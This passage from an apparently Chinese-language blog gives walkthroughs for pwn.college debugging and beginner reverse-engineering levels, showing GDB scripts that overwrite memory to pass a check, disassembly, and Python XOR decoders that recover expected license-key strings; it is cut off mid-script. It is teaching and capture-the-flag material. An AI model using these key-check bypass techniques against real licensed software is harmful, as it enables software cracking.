<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">step 或 s：逐行调试并进入函数</span><br><span class="line">next 或 n：逐行调试但不进入函数</span><br><span class="line">stepi 或 si：逐指令调试并进入函数</span><br><span class="line">nexti 或 ni：逐指令调试但不进入函数</span><br><span class="line">finish：执行当前函数直到返回</span><br><span class="line">break *&lt;address&gt;：在指定地址处设置断点。</span><br><span class="line">display/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;expression&gt;：实时显示值，格式与 x/&lt;n&gt;&lt;u&gt;&lt;f&gt; 命令相同。例如：</span><br><span class="line">	- display/8i $rip：始终显示接下来的8条指令。</span><br><span class="line">	- display/4gx $rsp：始终显示栈上的前4个值（每个值为8字节）</span><br><span class="line">layout regs：进入TUI模式，显示所有寄存器的内容和附近的指令</span><br></pre></td></tr></tbody></table></figure>
<p>本关要求：找到将被放置在栈上的一系列随机值</p>
<p>wp：步骤基本与上一关相同，只是多重复了几次</p></li>
<li><p>Debugging Refresher-level5：GDB脚本，<code>.gdb</code>文件</p>
<ul>
<li><p>将命令写入一个文件，例如 <code>x.gdb</code>。</p></li>
<li><p>使用 <code>-x &lt;PATH_TO_SCRIPT&gt;</code>
标志启动GDB，这个文件将在GDB启动后执行所有命令。</p>
<p>示例：<code>gdb -x script.gdb /path/to/your/program</code></p></li>
<li><p>可以使用 <code>-ex '&lt;COMMAND&gt;'</code>
来执行单个命令，多个命令可以使用多个 <code>-ex</code> 参数。</p></li>
<li><p>可以将一些常用命令放入 <code>~/.gdbinit</code> 文件中，例如
<code>set disassembly-flavor intel</code></p></li>
<li><p><code>commands</code> 和
<code>end</code>：用于定义在<strong>断点命中时自动执行</strong>的命令序列。</p></li>
</ul>
<p>本关要求：使用gdb脚本获取内存里的随机值</p>
<p>wp：首先找到<code>read</code>系统调用的地址，编写脚本<code>script.gdb</code>，运行<code>/challenge/embryogdb_level5 -x script.gdb</code>，然后根据回显内容操作，步骤与上一关相同，脚本内容如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">break *main+709</span><br><span class="line">commands</span><br><span class="line">  info registers</span><br><span class="line">  x/16gx $rsp</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line">continue</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>Debugging Refresher-level6：gdb可以修改程序状态</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 修改寄存器值：set $rdi = 0 将寄存器 $rdi 设置为 0。</span><br><span class="line">- 修改栈上的值：set *((uint64_t *) $rsp) = 0x1234 将栈顶的值设置为 0x1234。</span><br><span class="line">- 修改内存中的值：set *((uint16_t *) 0x31337000) = 0x1337 将地址 0x31337000 处的2个字节设置为 0x1337。</span><br></pre></td></tr></tbody></table></figure>
<p>wp：先找到<code>read</code>函数位置，然后找到scanf输入的字符存入的内存地址</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000001cd2 &lt;+556&gt;:   mov    ecx,eax</span><br><span class="line">0x0000000000001cd4 &lt;+558&gt;:   lea    rax,[rbp-0x18]</span><br><span class="line">0x0000000000001cd8 &lt;+562&gt;:   mov    edx,0x8</span><br><span class="line">0x0000000000001cdd &lt;+567&gt;:   mov    rsi,rax</span><br><span class="line">0x0000000000001ce0 &lt;+570&gt;:   mov    edi,ecx</span><br><span class="line">0x0000000000001ce2 &lt;+572&gt;:   call   0x1210 &lt;read@plt&gt;</span><br><span class="line">0x0000000000001ce7 &lt;+577&gt;:   lea    rdi,[rip+0xbf2]        # 0x28e0</span><br><span class="line">0x0000000000001cee &lt;+584&gt;:   call   0x1190 &lt;puts@plt&gt;</span><br><span class="line">0x0000000000001cf3 &lt;+589&gt;:   lea    rdi,[rip+0xc06]        # 0x2900</span><br><span class="line">0x0000000000001cfa &lt;+596&gt;:   mov    eax,0x0</span><br><span class="line">0x0000000000001cff &lt;+601&gt;:   call   0x11d0 &lt;printf@plt&gt;</span><br><span class="line">0x0000000000001d04 &lt;+606&gt;:   lea    rax,[rbp-0x10]</span><br><span class="line">0x0000000000001d08 &lt;+610&gt;:   mov    rsi,rax</span><br><span class="line">0x0000000000001d0b &lt;+613&gt;:   lea    rdi,[rip+0xbfd]        # 0x290f</span><br><span class="line">0x0000000000001d12 &lt;+620&gt;:   mov    eax,0x0</span><br><span class="line">0x0000000000001d17 &lt;+625&gt;:   call   0x1260 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">0x0000000000001d1c &lt;+630&gt;:   mov    rax,QWORD PTR [rbp-0x10]</span><br><span class="line">0x0000000000001d20 &lt;+634&gt;:   mov    rsi,rax</span><br><span class="line">0x0000000000001d23 &lt;+637&gt;:   lea    rdi,[rip+0xbea]        # 0x2914</span><br><span class="line">0x0000000000001d2a &lt;+644&gt;:   mov    eax,0x0</span><br></pre></td></tr></tbody></table></figure>
<p>由上述代码可知，<code>read</code>系统调用的缓冲区地址为<code>[rbp-0x18]</code>，然后<code>scanf</code>函数获取用户输入，只需将用户输入<code>[rbp-0x10]</code>地址处的内容修改为<code>[rbp-0x18]</code>地址处的内容即可，完整脚本如下，运行后输入一次任意字符，回车后即可得到flag</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">break *main+577</span><br><span class="line">commands</span><br><span class="line">  silent</span><br><span class="line">  p/x $rsi</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">break *main+637</span><br><span class="line">commands</span><br><span class="line">  silent</span><br><span class="line">  # 涉及的是内存内容的操作</span><br><span class="line">  set *((uint64_t *) ($rbp-0x10)) = *((uint64_t *)($rbp-0x18))</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">continue</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>Debugging Refresher-level7：提升权限的 GDB 实例。</p>
<p>wp：运行关卡文件，<code>run</code>运行程序，根据提示使用<code>call (void)win()</code>然后到得到flag</p></li>
<li><p>Debugging
Refresher-level8：无法直接使用<code>call (void)win()</code>得到flag</p>
<p>wp：题目没给提示，没有一点思路，参考大佬的<a target="_blank" rel="noopener" href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#reverse-engineering-writeups">wp</a></p>
<blockquote>
<p><code>SIGSEGV</code> 是指操作系统发送给进程的一种信号，全称为
"Segmentation
Violation"（段错误）。它是一种常见的程序运行时错误，通常发生在以下几种情况下：</p>
<ol type="1">
<li><strong>空指针解引用</strong>：试图读取或写入空指针所指向的内存位置。</li>
<li><strong>访问未分配的内存</strong>：试图访问未被操作系统分配的内存区域，比如访问超出了进程内存空间范围的地址。</li>
<li><strong>只读内存访问</strong>：试图写入只读内存区域。</li>
<li><strong>内存访问越界</strong>：试图访问数组或者其他数据结构的时候，超出了其分配的内存范围。</li>
<li><strong>栈溢出</strong>：栈区内存溢出，超出了当前栈的容量</li>
</ol>
<p>在大多数操作系统中，尝试在地址 <code>0x0</code>
处进行读取操作会导致一个 <code>SIGSEGV</code>
信号，即空指针异常。这是因为操作系统通常会将地址 <code>0x0</code>
保留为未分配的内存，访问这些地址会导致程序崩溃。</p>
</blockquote></li>
<li><p>level1.0：找到正确的注册码</p>
<p>wp：运行<code>/challenge/</code>文件夹下的文件，任意输入几个字符得到回显</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Expected result:</span><br><span class="line"></span><br><span class="line">        64 66 6c 78 6d</span><br></pre></td></tr></tbody></table></figure>
<p>将上述十六进制转为ASCii码，得到<code>dflxm</code>，再次运行目标文件，输入字符串，得到flag</p></li>
<li><p>level1.1：要求同上一关，但是没有回显提示正确字符串</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) bt：显示当前线程的调用栈（backtrace），包括每一帧的调用函数、文件名、行号以及参数等信息</span><br><span class="line">(gdb) info stack：命令也显示当前线程的调用栈，但它有更多选项，可以更灵活地控制输出格式和内容</span><br></pre></td></tr></tbody></table></figure>
<p>wp：首先尝试直接运行，但是发现不回显正确字符串，于是使用gdb进行调试，但是<code>disas main</code>无法查看汇编指令，对<code>main</code>下断点也失败。尝试使用<code>objdump -M intel -d /challenge/babyrev_level1.1 &gt; level1_1</code>反汇编目标文件并将汇编代码保存到<code>level1_1</code>中，大致浏览一下代码看看重要函数，发现<code>memcmp</code>函数，下面是该函数的分析</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">memcmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *s1, <span class="type">const</span> <span class="type">void</span> *s2, <span class="type">size_t</span> n)</span>;</span><br><span class="line">- s1：指向第一个内存块的指针。</span><br><span class="line">- s2：指向第二个内存块的指针。</span><br><span class="line">- n：要比较的字节数。</span><br></pre></td></tr></tbody></table></figure>
<p>反汇编得到的代码中没有真实地址，需要运行才能得到，参考大佬的<a target="_blank" rel="noopener" href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#reverse-engineering-writeups">wp</a>，首先通过gdb运行程序在输入环节直接截停(ctrl+c)程序，然后通过<code>bt</code>命令查看函数调用栈，得到：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007fb965acf1f2 <span class="keyword">in</span> __GI___libc_read (fd=0, buf=0x7ffe3d7e8e92, nbytes=5)</span></span><br><span class="line">    at ../sysdeps/unix/sysv/linux/read.c:26</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x000055b29983a535 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  0x00007fb9659e5083 <span class="keyword">in</span> __libc_start_main (main=0x55b29983a412, argc=1, argv=0x7ffe3d7e8f98,</span></span><br><span class="line">    init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7ffe3d7e8f88)</span><br><span class="line">    at ../csu/libc-start.c:308</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  0x000055b29983a22e <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></tbody></table></figure>
<p>然后使用<code>x/80i 0x55b29983a412</code>查看<code>main</code>的内容，找到<code>memcmp</code>函数：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55b29983a541:      lea    rax,[rbp-0xe]</span><br><span class="line">0x55b29983a545:      mov    edx,0x5</span><br><span class="line">0x55b29983a54a:      lea    rsi,[rip+0x2abf]        # 0x55b29983d010</span><br><span class="line">0x55b29983a551:      mov    rdi,rax</span><br><span class="line">0x55b29983a554:      call   0x55b29983a1b0 &lt;memcmp@plt&gt;</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p><code>rsi</code>中存放的就是flag的地址即注释中的地址，使用<code>x/5c 0x55b29983d010</code>得到正确字符串：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x55b29983d010: 104 'h' 103 'g' 115 's' 97 'a'  97 'a'</span><br></pre></td></tr></tbody></table></figure>
<p>然后退出gdb重新运行程序，输入正确字符串，得到flag</p>
<ul>
<li><p>level2.0：字符串比较前被修改过。</p>
<p>wp：首先根据回显得到目标字符串<code>zdniz</code>，但是输入该字符串无法得到flag，于是使用gdb调试，在<code>memcmp</code>
处下断点，然后运行至该处，查看被比较的两个字符串，发现我输入的字符串中第三个和第四个字符顺序对调了，所以在输入时将这两个字符顺序对调即可得到flag</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/5c $rdi</span><br><span class="line">0x7ffda4747842: 122 'z' 100 'd' 105 'i' 110 'n' 122 'z'</span><br><span class="line">(gdb) x/5c $rsi</span><br><span class="line">0x5605e890c010 &lt;EXPECTED_RESULT&gt;:       122 'z' 100 'd' 110 'n' 105 'i' 122 'z'</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level2.1：思路同1.1</p>
<p>wp：运行程序不回显正确字符串，运行gdb无法使用<code>disas main</code>，所以使用1.1的思路，首先在gdb中<code>run</code>，然后不输入字符串直接<code>ctrl+c</code>停止运行，使用<code>bt</code>查看栈中函数：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007fc3682811f2 <span class="keyword">in</span> <span class="built_in">read</span> () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x000055fafae44535 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  0x00007fc368197083 <span class="keyword">in</span> __libc_start_main () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  0x000055fafae4422e <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></tbody></table></figure>
<p>首先查看<code>__libc_start_main</code>函数，没发现特殊函数，也没显示参数。然后我就在这卡住了，于是尝试<code>x/15i 0x000055fafae44535</code>（<code>read</code>函数下面的<code>??</code>函数），发现<code>memcmp</code>函数：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x55fafae44535:      movzx  eax,BYTE PTR [rbp-0xd]</span><br><span class="line">0x55fafae44539:      mov    BYTE PTR [rbp-0x10],al</span><br><span class="line">0x55fafae4453c:      movzx  eax,BYTE PTR [rbp-0xb]</span><br><span class="line">0x55fafae44540:      mov    BYTE PTR [rbp-0xf],al</span><br><span class="line">0x55fafae44543:      movzx  eax,BYTE PTR [rbp-0xf]</span><br><span class="line">0x55fafae44547:      mov    BYTE PTR [rbp-0xd],al</span><br><span class="line">0x55fafae4454a:      movzx  eax,BYTE PTR [rbp-0x10]</span><br><span class="line">0x55fafae4454e:      mov    BYTE PTR [rbp-0xb],al</span><br><span class="line">0x55fafae44551:      lea    rdi,[rip+0xdb0]        # 0x55fafae45308</span><br><span class="line">0x55fafae44558:      call   0x55fafae44140 &lt;puts@plt&gt;</span><br><span class="line">0x55fafae4455d:      lea    rax,[rbp-0xe]</span><br><span class="line">0x55fafae44561:      mov    edx,0x5</span><br><span class="line">0x55fafae44566:      lea    rsi,[rip+0x2aa3]        # 0x55fafae47010</span><br><span class="line">0x55fafae4456d:      mov    rdi,rax</span><br><span class="line">0x55fafae44570:      call   0x55fafae441b0 &lt;memcmp@plt&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>接着设置断点，查看相关寄存器或内存的内容，详细步骤如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x55fafae44570</span><br><span class="line">Breakpoint 1 at 0x55fafae44570</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">zalf    # 注意这里我只输入了4个字符，因为回车也算一个字符，若输入5个字符则会跳过断点</span><br><span class="line">Checking the received license key!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000055fafae44570 in ?? ()</span><br><span class="line">(gdb) x/5c 0x55fafae47010</span><br><span class="line">0x55fafae47010: 122 'z' 97 'a'  108 'l' 102 'f' 109 'm'</span><br><span class="line">(gdb) x/5c $rbp-0xe</span><br><span class="line">0x7fff3386c952: 122 'z' 102 'f' 108 'l' 97 'a'  10 '\n'</span><br></pre></td></tr></tbody></table></figure>
<p>得到目标字符串<code>zalfm</code>，发现我输入的字符串中第二个和第四个字符顺序对调，退出gdb，重新运行目标程序，输入字符串<code>zflam</code>，回车得到flag</p></li>
<li><p>level3.0：思路同2.0</p>
<p>wp：逆序输入字符串</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/5c 0x55f839045010</span><br><span class="line">0x55f839045010 &lt;EXPECTED_RESULT&gt;: 109 'm' 111 'o' 114 'r' 106 'j' 116 't'</span><br><span class="line">(gdb) x/5c $rbp-0xe</span><br><span class="line">0x7fff5d8dea92: 116 't' 106 'j' 114 'r' 111 'o' 109 'm'</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level3.1：同2.1</p></li>
<li><p>level4.0：同2.0，没发现字符串被修改了</p></li>
<li><p>level4.1：同2.1，按照ASCii码表的顺序修改？</p></li>
<li><p>level5.0：运行目标程序，任意输入五个字符，得到提示</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This challenge is now mangling your input using the `xor` mangler with key `0x64`</span><br></pre></td></tr></tbody></table></figure>
<p>wp：只需要将目标十六进制与<code>0x64</code>进行异或即可得到正确字符串</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x0b</span>, <span class="number">0x0e</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x12</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">	s[i] = <span class="built_in">chr</span>(s[i] ^ <span class="number">0x64</span>)</span><br><span class="line"><span class="built_in">print</span>(s)  <span class="comment"># ojsvv</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5.1：同5.0</p>
<p>wp：步骤同2.1，先找到正确的字符串，得到下面的结果，并不是常见的ASCii码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 使用 x/5c 0x5582accad010</span><br><span class="line">0x55c7c5bfa010: -80 '\260'  -93 '\243'  -93 '\243'  -88 '\250'  -91 '\245'</span><br><span class="line"># 十进制（有符号整数）：负数值</span><br><span class="line"># 字符表示：对应的 ASCII 字符，用八进制表示（\xxx）</span><br><span class="line"></span><br><span class="line"># 或者使用 x/5bx 0x5582accad010 得到下面结果</span><br><span class="line">0x5582accad010: 0xb0    0xa3    0xa3    0xa8    0xa5</span><br></pre></td></tr></tbody></table></figure>
<p>然后按照之前的步骤，找到关键代码：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0x55c7c5bf7535:      mov    DWORD PTR [rbp-0x14],0x0</span><br><span class="line">0x55c7c5bf753c:      jmp    0x55c7c5bf755b</span><br><span class="line">0x55c7c5bf753e:      mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line">0x55c7c5bf7541:      cdqe</span><br><span class="line">0x55c7c5bf7543:      movzx  eax,BYTE PTR [rbp+rax*1-0xe]</span><br><span class="line">0x55c7c5bf7548:      xor    eax,0xffffffd1</span><br><span class="line">0x55c7c5bf754b:      mov    edx,eax</span><br><span class="line">0x55c7c5bf754d:      mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line">0x55c7c5bf7550:      cdqe</span><br><span class="line">0x55c7c5bf7552:      mov    BYTE PTR [rbp+rax*1-0xe],dl</span><br><span class="line">0x55c7c5bf7556:      nop</span><br><span class="line">0x55c7c5bf7557:      add    DWORD PTR [rbp-0x14],0x1</span><br><span class="line">0x55c7c5bf755b:      cmp    DWORD PTR [rbp-0x14],0x4</span><br><span class="line">0x55c7c5bf755f:      jle    0x55c7c5bf753e</span><br><span class="line">0x55c7c5bf7561:      lea    rdi,[rip+0xda0]        # 0x55c7c5bf8308</span><br><span class="line">0x55c7c5bf7568:      call   0x55c7c5bf7140 &lt;puts@plt&gt;</span><br><span class="line">0x55c7c5bf756d:      lea    rax,[rbp-0xe]</span><br><span class="line">0x55c7c5bf7571:      mov    edx,0x5</span><br><span class="line">0x55c7c5bf7576:      lea    rsi,[rip+0x2a93]        # 0x55c7c5bfa010</span><br><span class="line">0x55c7c5bf757d:      mov    rdi,rax</span><br><span class="line">0x55c7c5bf7580:      call   0x55c7c5bf71b0 &lt;memcmp@plt&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>分析上述代码，可知输入的每个字符都进行了异或操作，循环5次（共5个字符），参与异或的立即数是<code>0xffffffd1</code>，是32位整数，但是最终只要求8位（1字节），所以脚本如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xb0</span>, <span class="number">0xa3</span>, <span class="number">0xa3</span>, <span class="number">0xa8</span>, <span class="number">0xa5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	s1[i] = <span class="built_in">chr</span>(s1[i] ^ <span class="number">0xffffffd1</span> &amp; <span class="number">0xff</span>)  <span class="comment"># 0xff 是为了获取低8位</span></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></tbody></table></figure>
<p>或者使用十进制进行计算（不推荐，涉及到负数和补码）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = [-<span class="number">80</span>, -<span class="number">93</span>, -<span class="number">93</span>, -<span class="number">88</span>, -<span class="number">91</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">	s[i] = <span class="built_in">chr</span>(s[i] ^ -<span class="number">47</span>) </span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level6.0：简单</p>
<p>wp：直接运行，得到目标字符串的十六进制，转换为ASCII码，再次运行，输入正确字符串得到flag</p></li>
<li><p>level6.1：同5.1</p>
<p>wp：首先找到关键代码，发现目标字符串有18个字符，剩下的步骤与5.1相同</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xcc</span>,<span class="number">0xd4</span>,<span class="number">0xd7</span>,<span class="number">0xc9</span>,<span class="number">0xd9</span>,<span class="number">0xd9</span>,<span class="number">0xd9</span>,<span class="number">0xcd</span>,<span class="number">0xcd</span>,<span class="number">0xdf</span>,<span class="number">0xd2</span>,<span class="number">0xcd</span>,<span class="number">0xd1</span>,<span class="number">0xda</span>,<span class="number">0xd9</span>,<span class="number">0xce</span>,<span class="number">0xd9</span>,<span class="number">0xd6</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	flag += <span class="built_in">chr</span>(s1[i] ^ <span class="number">0xffffffbb</span> &amp; <span class="number">0xff</span>) </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level7.0：运行目标程序，任意输入字符串，得到提示</p>
<p>wp：根据提示一步一步编写脚本，注意这里的异或操作，不是将每个字节与每个立即数进行异或，而是每个字节对应立即数的其中一个字节进行异或</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0x5c</span>, <span class="number">0x6d</span>, <span class="number">0xf2</span>, <span class="number">0x49</span>, <span class="number">0x94</span>, <span class="number">0x37</span>, <span class="number">0xa9</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xf1</span>, <span class="number">0xf0</span>, <span class="number">0x0f</span>, <span class="number">0x49</span>, <span class="number">0x30</span>, <span class="number">0x2f</span>, <span class="number">0x4b</span>, <span class="number">0x09</span>, <span class="number">0x2e</span>, <span class="number">0xfe</span>, <span class="number">0x97</span>, <span class="number">0x51</span>, <span class="number">0x6f</span>, <span class="number">0xf4</span>, <span class="number">0x5e</span>, <span class="number">0x9e</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>, <span class="number">0x51</span>, <span class="number">0x50</span>]</span><br><span class="line">s2 = [<span class="number">0xc68dc3ca1f</span>, <span class="number">0xc899</span>, <span class="number">0x2be19206</span>, <span class="number">0x11f1047f</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s2)):</span><br><span class="line">	length = <span class="built_in">round</span>(s2[j].bit_length()/<span class="number">8</span>)  <span class="comment"># 获取字节数</span></span><br><span class="line">	<span class="built_in">print</span>(length)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">		s1[i] = s1[i] ^ (s2[j] &gt;&gt; ((length-<span class="number">1</span> - i%length)*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">		<span class="comment">#flag += chr(s1[i] ^ 0xc68dc3ca1f ^ 0xc899 ^ 0x2be19206 ^ 0x11f1047f )</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	flag += <span class="built_in">chr</span>(s1[i])</span><br><span class="line">	<span class="comment">#print(hex(s1[i]))</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line">tmp = flag[<span 